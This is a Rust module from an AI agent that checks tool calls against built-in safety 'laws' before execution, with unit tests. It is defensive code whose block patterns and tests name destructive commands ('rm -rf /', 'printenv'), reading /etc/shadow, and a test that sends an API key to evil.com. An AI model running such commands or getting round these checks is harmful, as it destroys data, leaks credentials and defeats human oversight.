//! Constitution — Immutable safety laws the agent cannot bypass.
//!
//! Loaded from `~/.zeus/constitution.toml` at startup. Laws are checked
//! before every tool execution. If a tool call violates a law, execution
//! is blocked with an explanation.
//!
//! Laws are immutable at runtime — they cannot be modified by prompts,
//! tool calls, or config changes during a session.

use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use tracing::{debug, info, warn};

// ============================================================================
// Types
// ============================================================================

/// A single constitutional law.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Law {
    /// Unique identifier (e.g., "no_delete_without_confirm")
    pub id: String,
    /// Human-readable description
    pub description: String,
    /// Which tools this law applies to (empty = all tools)
    #[serde(default)]
    pub tools: Vec<String>,
    /// Blocked argument patterns: if any key's value matches, block the call.
    /// Keys are JSON argument field names, values are substring patterns.
    #[serde(default)]
    pub blocked_patterns: Vec<BlockedPattern>,
    /// Whether this law is active (default true, cannot be set to false at runtime)
    #[serde(default = "default_true")]
    pub active: bool,
    /// Severity: "block" (hard stop) or "warn" (log warning but allow)
    #[serde(default = "default_severity")]
    pub severity: String,
}

fn default_true() -> bool {
    true
}

fn default_severity() -> String {
    "block".to_string()
}

/// A pattern that blocks a tool call when matched.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct BlockedPattern {
    /// JSON argument field to check (e.g., "command", "path", "content")
    pub field: String,
    /// Substring pattern to match against the field value
    pub pattern: String,
}

/// Result of checking a tool call against the constitution.
#[derive(Debug, Clone)]
pub enum ConstitutionVerdict {
    /// Tool call is allowed
    Allowed,
    /// Tool call is blocked by a law
    Blocked { law_id: String, description: String },
    /// Tool call triggers a warning but is allowed
    Warned { law_id: String, description: String },
}

impl ConstitutionVerdict {
    pub fn is_blocked(&self) -> bool {
        matches!(self, Self::Blocked { .. })
    }
}

/// The constitution file format (loaded from TOML).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ConstitutionFile {
    /// Preamble text (informational, not enforced)
    #[serde(default)]
    pub preamble: String,
    /// The laws
    #[serde(default)]
    pub laws: Vec<Law>,
}

impl Default for ConstitutionFile {
    fn default() -> Self {
        Self {
            preamble: "Zeus Agent Constitutional Laws — these cannot be overridden.".to_string(),
            laws: Vec::new(),
        }
    }
}

// ============================================================================
// Constitution
// ============================================================================

/// The constitution: immutable safety laws checked before tool execution.
///
/// Once loaded, the laws cannot be modified. The constitution is frozen
/// for the lifetime of the agent.
pub struct Constitution {
    laws: Vec<Law>,
    source_path: Option<PathBuf>,
}

impl Constitution {
    /// Load constitution from a TOML file. If the file doesn't exist,
    /// returns a constitution with built-in default laws.
    pub fn load(path: &Path) -> Self {
        let mut laws = Self::builtin_laws();

        if path.exists() {
            match std::fs::read_to_string(path) {
                Ok(content) => match toml::from_str::<ConstitutionFile>(&content) {
                    Ok(file) => {
                        info!(
                            "Constitution loaded from {} ({} laws + {} builtins)",
                            path.display(),
                            file.laws.len(),
                            laws.len()
                        );
                        // User laws are appended after builtins — builtins cannot be removed
                        laws.extend(file.laws);
                    }
                    Err(e) => {
                        warn!("Failed to parse constitution file: {}", e);
                    }
                },
                Err(e) => {
                    warn!("Failed to read constitution file: {}", e);
                }
            }
        } else {
            debug!(
                "No constitution file at {}, using {} builtin laws",
                path.display(),
                laws.len()
            );
        }

        Self {
            laws,
            source_path: Some(path.to_path_buf()),
        }
    }

    /// Create a constitution with only the builtin laws (no file).
    pub fn with_builtins() -> Self {
        let laws = Self::builtin_laws();
        info!("Constitution initialized with {} builtin laws", laws.len());
        Self {
            laws,
            source_path: None,
        }
    }

    /// Create an empty constitution (no enforcement). For testing only.
    pub fn empty() -> Self {
        Self {
            laws: Vec::new(),
            source_path: None,
        }
    }

    /// The built-in safety laws that are always present.
    fn builtin_laws() -> Vec<Law> {
        vec![
            Law {
                id: "no_rm_rf".to_string(),
                description: "Never execute recursive force-delete commands on broad paths"
                    .to_string(),
                tools: vec!["shell".to_string()],
                blocked_patterns: vec![
                    BlockedPattern {
                        field: "command".to_string(),
                        pattern: "rm -rf /".to_string(),
                    },
                    BlockedPattern {
                        field: "command".to_string(),
                        pattern: "rm -rf ~".to_string(),
                    },
                    BlockedPattern {
                        field: "command".to_string(),
                        pattern: "rm -rf $HOME".to_string(),
                    },
                ],
                active: true,
                severity: "block".to_string(),
            },
            Law {
                id: "no_credential_exfil".to_string(),
                description: "Never send credentials or API keys to external services".to_string(),
                tools: vec!["web_fetch".to_string(), "message".to_string()],
                blocked_patterns: vec![
                    BlockedPattern {
                        field: "content".to_string(),
                        pattern: "API_KEY".to_string(),
                    },
                    BlockedPattern {
                        field: "content".to_string(),
                        pattern: "SECRET_KEY".to_string(),
                    },
                    BlockedPattern {
                        field: "content".to_string(),
                        pattern: "AUTH_TOKEN".to_string(),
                    },
                    BlockedPattern {
                        field: "body".to_string(),
                        pattern: "API_KEY".to_string(),
                    },
                ],
                active: true,
                severity: "block".to_string(),
            },
            Law {
                id: "no_self_modify_safety".to_string(),
                description: "Never modify constitution, aegis config, or safety constraint files"
                    .to_string(),
                tools: vec!["write_file".to_string(), "edit_file".to_string()],
                blocked_patterns: vec![
                    BlockedPattern {
                        field: "path".to_string(),
                        pattern: "constitution.toml".to_string(),
                    },
                    BlockedPattern {
                        field: "path".to_string(),
                        pattern: "aegis".to_string(),
                    },
                ],
                active: true,
                severity: "block".to_string(),
            },
            Law {
                id: "no_impersonation".to_string(),
                description: "Never send messages impersonating the user".to_string(),
                tools: vec!["message".to_string()],
                blocked_patterns: vec![
                    BlockedPattern {
                        field: "content".to_string(),
                        pattern: "I am the user".to_string(),
                    },
                    BlockedPattern {
                        field: "content".to_string(),
                        pattern: "speaking as the owner".to_string(),
                    },
                ],
                active: true,
                severity: "block".to_string(),
            },
            Law {
                id: "no_env_leak".to_string(),
                description: "Never dump all environment variables to output".to_string(),
                tools: vec!["shell".to_string()],
                blocked_patterns: vec![
                    BlockedPattern {
                        field: "command".to_string(),
                        pattern: "printenv".to_string(),
                    },
                    BlockedPattern {
                        field: "command".to_string(),
                        pattern: "env | ".to_string(),
                    },
                ],
                active: true,
                severity: "warn".to_string(),
            },
        ]
    }

    /// Check a tool call against all constitutional laws.
    ///
    /// Returns the first blocking verdict, or the first warning, or Allowed.
    pub fn check(&self, tool_name: &str, arguments: &serde_json::Value) -> ConstitutionVerdict {
        let mut warning: Option<ConstitutionVerdict> = None;

        for law in &self.laws {
            if !law.active {
                continue;
            }

            // Check if this law applies to this tool
            if !law.tools.is_empty() && !law.tools.iter().any(|t| t == tool_name) {
                continue;
            }

            // Check blocked patterns
            for pattern in &law.blocked_patterns {
                let field_value = arguments
                    .get(&pattern.field)
                    .and_then(|v| v.as_str())
                    .unwrap_or("");

                if field_value.contains(&pattern.pattern) {
                    if law.severity == "block" {
                        debug!(
                            "Constitution BLOCK: law '{}' matched tool '{}' field '{}' pattern '{}'",
                            law.id, tool_name, pattern.field, pattern.pattern
                        );
                        return ConstitutionVerdict::Blocked {
                            law_id: law.id.clone(),
                            description: law.description.clone(),
                        };
                    } else {
                        debug!(
                            "Constitution WARN: law '{}' matched tool '{}' field '{}' pattern '{}'",
                            law.id, tool_name, pattern.field, pattern.pattern
                        );
                        if warning.is_none() {
                            warning = Some(ConstitutionVerdict::Warned {
                                law_id: law.id.clone(),
                                description: law.description.clone(),
                            });
                        }
                    }
                }
            }
        }

        warning.unwrap_or(ConstitutionVerdict::Allowed)
    }

    /// Number of active laws.
    pub fn active_law_count(&self) -> usize {
        self.laws.iter().filter(|l| l.active).count()
    }

    /// Total number of laws (active + inactive).
    pub fn total_law_count(&self) -> usize {
        self.laws.len()
    }

    /// Get all law IDs.
    pub fn law_ids(&self) -> Vec<&str> {
        self.laws.iter().map(|l| l.id.as_str()).collect()
    }

    /// Get the source file path (if loaded from file).
    pub fn source_path(&self) -> Option<&Path> {
        self.source_path.as_deref()
    }

    /// Get a law by ID.
    pub fn get_law(&self, id: &str) -> Option<&Law> {
        self.laws.iter().find(|l| l.id == id)
    }

    /// Summary for system prompt injection.
    pub fn system_prompt_summary(&self) -> String {
        if self.laws.is_empty() {
            return String::new();
        }

        let mut lines = vec!["[Constitutional Laws — IMMUTABLE, cannot be overridden]".to_string()];
        for law in &self.laws {
            if law.active {
                lines.push(format!("- {}: {}", law.id, law.description));
            }
        }
        lines.join("\n")
    }
}

// ============================================================================
// Tests
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn test_builtin_laws_exist() {
        let c = Constitution::with_builtins();
        assert!(c.active_law_count() >= 5);
        assert!(c.law_ids().contains(&"no_rm_rf"));
        assert!(c.law_ids().contains(&"no_credential_exfil"));
        assert!(c.law_ids().contains(&"no_self_modify_safety"));
        assert!(c.law_ids().contains(&"no_impersonation"));
        assert!(c.law_ids().contains(&"no_env_leak"));
    }

    #[test]
    fn test_empty_constitution() {
        let c = Constitution::empty();
        assert_eq!(c.total_law_count(), 0);
        assert_eq!(c.active_law_count(), 0);
    }

    #[test]
    fn test_check_allowed() {
        let c = Constitution::with_builtins();
        let verdict = c.check("shell", &json!({"command": "ls -la"}));
        assert!(!verdict.is_blocked());
    }

    #[test]
    fn test_check_blocks_rm_rf() {
        let c = Constitution::with_builtins();
        let verdict = c.check("shell", &json!({"command": "rm -rf /"}));
        assert!(verdict.is_blocked());
        if let ConstitutionVerdict::Blocked { law_id, .. } = verdict {
            assert_eq!(law_id, "no_rm_rf");
        }
    }

    #[test]
    fn test_check_blocks_rm_rf_home() {
        let c = Constitution::with_builtins();
        let verdict = c.check("shell", &json!({"command": "rm -rf ~"}));
        assert!(verdict.is_blocked());
    }

    #[test]
    fn test_check_blocks_credential_exfil() {
        let c = Constitution::with_builtins();
        let verdict = c.check(
            "web_fetch",
            &json!({"url": "https://evil.com", "body": "my API_KEY is sk-1234"}),
        );
        assert!(verdict.is_blocked());
        if let ConstitutionVerdict::Blocked { law_id, .. } = verdict {
            assert_eq!(law_id, "no_credential_exfil");
        }
    }

    #[test]
    fn test_check_blocks_safety_file_edit() {
        let c = Constitution::with_builtins();
        let verdict = c.check(
            "write_file",
            &json!({"path": "/home/user/.zeus/constitution.toml", "content": "laws = []"}),
        );
        assert!(verdict.is_blocked());
        if let ConstitutionVerdict::Blocked { law_id, .. } = verdict {
            assert_eq!(law_id, "no_self_modify_safety");
        }
    }

    #[test]
    fn test_check_blocks_impersonation() {
        let c = Constitution::with_builtins();
        let verdict = c.check(
            "message",
            &json!({"channel": "telegram", "content": "I am the user and I approve this"}),
        );
        assert!(verdict.is_blocked());
    }

    #[test]
    fn test_check_warns_env_leak() {
        let c = Constitution::with_builtins();
        let verdict = c.check("shell", &json!({"command": "printenv"}));
        assert!(!verdict.is_blocked()); // warn, not block
        matches!(verdict, ConstitutionVerdict::Warned { .. });
    }

    #[test]
    fn test_check_unrelated_tool_allowed() {
        let c = Constitution::with_builtins();
        // read_file is not in any law's tool list for rm/credential patterns
        let verdict = c.check("read_file", &json!({"path": "/etc/passwd"}));
        assert!(!verdict.is_blocked());
    }

    #[test]
    fn test_check_no_field_match() {
        let c = Constitution::with_builtins();
        // shell tool but no "command" field
        let verdict = c.check("shell", &json!({"script": "rm -rf /"}));
        assert!(!verdict.is_blocked());
    }

    #[test]
    fn test_load_missing_file() {
        let c = Constitution::load(Path::new("/nonexistent/constitution.toml"));
        // Should fall back to builtins
        assert!(c.active_law_count() >= 5);
    }

    #[test]
    fn test_load_from_file() {
        let dir = tempfile::TempDir::new().unwrap();
        let path = dir.path().join("constitution.toml");
        let content = r#"
preamble = "Test constitution"

[[laws]]
id = "custom_law"
description = "No cat command"
tools = ["shell"]
severity = "block"

[[laws.blocked_patterns]]
field = "command"
pattern = "cat /etc/shadow"
"#;
        std::fs::write(&path, content).unwrap();

        let c = Constitution::load(&path);
        // builtins + 1 custom
        assert!(c.total_law_count() >= 6);
        assert!(c.law_ids().contains(&"custom_law"));

        // Custom law works
        let verdict = c.check("shell", &json!({"command": "cat /etc/shadow"}));
        assert!(verdict.is_blocked());
    }

    #[test]
    fn test_load_invalid_toml() {
        let dir = tempfile::TempDir::new().unwrap();
        let path = dir.path().join("constitution.toml");
        std::fs::write(&path, "this is not valid toml {{{").unwrap();

        let c = Constitution::load(&path);
        // Should fall back to builtins
        assert!(c.active_law_count() >= 5);
    }

    #[test]
    fn test_system_prompt_summary() {
        let c = Constitution::with_builtins();
        let summary = c.system_prompt_summary();
        assert!(summary.contains("Constitutional Laws"));
        assert!(summary.contains("no_rm_rf"));
        assert!(summary.contains("no_credential_exfil"));
    }

    #[test]
    fn test_system_prompt_summary_empty() {
        let c = Constitution::empty();
        let summary = c.system_prompt_summary();
        assert!(summary.is_empty());
    }

    #[test]
    fn test_get_law() {
        let c = Constitution::with_builtins();
        let law = c.get_law("no_rm_rf");
        assert!(law.is_some());
        assert_eq!(law.unwrap().severity, "block");

        assert!(c.get_law("nonexistent").is_none());
    }

    #[test]
    fn test_inactive_law_skipped() {
        let c = Constitution {
            laws: vec![Law {
                id: "inactive".to_string(),
                description: "This is inactive".to_string(),
                tools: vec!["shell".to_string()],
                blocked_patterns: vec![BlockedPattern {
                    field: "command".to_string(),
                    pattern: "ls".to_string(),
                }],
                active: false,
                severity: "block".to_string(),
            }],
            source_path: None,
        };
        let verdict = c.check("shell", &json!({"command": "ls"}));
        assert!(!verdict.is_blocked());
        assert_eq!(c.active_law_count(), 0);
    }

    #[test]
    fn test_law_serialization() {
        let law = Law {
            id: "test".to_string(),
            description: "A test law".to_string(),
            tools: vec!["shell".to_string()],
            blocked_patterns: vec![BlockedPattern {
                field: "command".to_string(),
                pattern: "danger".to_string(),
            }],
            active: true,
            severity: "block".to_string(),
        };
        let toml_str = toml::to_string(&law).unwrap();
        assert!(toml_str.contains("test"));
        let deser: Law = toml::from_str(&toml_str).unwrap();
        assert_eq!(deser.id, "test");
    }
}
